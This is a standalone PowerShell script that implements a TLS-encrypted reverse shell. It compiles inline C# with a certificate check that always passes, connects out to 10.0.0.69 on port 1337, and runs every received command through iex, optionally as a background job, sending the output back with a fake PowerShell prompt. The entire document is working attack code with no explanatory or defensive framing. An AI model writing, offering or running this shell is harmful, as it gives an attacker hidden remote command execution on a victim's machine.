$v = @'
using System;
using System.Net;
using System.Net.Sockets;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
namespace SSC
{
    public class SSC
    {
        public static SslStream b(TcpClient c)
        {
            return new SslStream(c.GetStream(), false, new RemoteCertificateValidationCallback(V), null);
        }
        public static bool V
        (
            Object o,
            X509Certificate c,
            X509Chain h,
            SslPolicyErrors e
        )
        {
            return true;
        }
    }
}
'@
Add-Type $v;
$c = New-Object Net.Sockets.TcpClient('10.0.0.69',1337)
$s = [SSC.SSC]::b($c)
$s.AuthenticateAsClient("")
[byte[]]$b = 0..65535|%{0}
while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i)
if ($d.StartsWith("sync ")){
$d = $d -replace "sync "
$j = Start-Job -ScriptBlock { try { iex $using:d } catch { echo ($Error[0] | Out-String) } }
while ($j.State -ne "Completed"){
$s1 = (Receive-Job $j | Out-String)
if ($s1 -ne ""){
$s2 = ([text.encoding]::ASCII).GetBytes($s1)
$s.Write($s2,0,$s2.Length)
$s.Flush()}}
$s1 = 'PS ' + (pwd).Path + '> '
$s2 = ([text.encoding]::ASCII).GetBytes($s1)
$s.Write($s2,0,$s2.Length)
$s.Flush()} else {
$s1 = ""
try { $s1 += (iex $d | Out-String) } catch { $s1 += ($Error[0] | Out-String) }
$s2 = $s1 + 'PS ' + (pwd).Path + '> '
$s3 = ([text.encoding]::ASCII).GetBytes($s2)
$s.Write($s3,0,$s3.Length)
$s.Flush()
}}
$c.Close()
